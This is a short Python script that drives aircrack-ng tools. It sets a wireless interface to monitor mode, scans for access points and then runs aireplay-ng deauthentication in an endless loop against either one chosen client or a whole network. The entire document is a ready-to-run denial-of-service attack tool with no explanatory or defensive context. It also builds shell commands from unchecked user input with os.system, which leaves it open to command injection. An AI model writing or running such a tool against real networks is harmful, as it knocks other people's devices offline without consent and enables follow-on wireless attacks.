import os
import signal

# Prompt the user to choose a wireless interface and set it to monitor mode
interface_choice = input("Enter the wireless interface to use in monitor mode: ").lower()
os.system(f"sudo iwconfig {interface_choice} mode monitor")

monitor_interface = interface_choice

# Scan for both 2.4GHz and 5GHz wireless networks on the monitor interface
os.system(f"sudo airodump-ng -b abg {monitor_interface}")

# Prompt the user to choose a network
bssid = input("Enter the BSSID of the access point: ")

# Prompt the user to choose a channel for the monitor interface
channel = input(f"Enter the channel for {monitor_interface} (e.g., 1, 6, 11): ")
os.system(f"sudo iwconfig {monitor_interface} channel {channel}")

# Prompt the user to choose between deauthenticating a client only or the whole network
choice = input("Do you want to deauthenticate a client only? (y/n): ")
if choice.lower() == "y":
    client = input("Enter the MAC address of the client: ")
    command = f"sudo aireplay-ng -0 0 -a {bssid} -c {client} {monitor_interface}"
else:
    command = f"sudo aireplay-ng -0 0 -a {bssid} {monitor_interface}"

# Execute the attack command
print("Starting deauthentication attack. Press Ctrl+C to quit.")
while True:
    os.system(command)
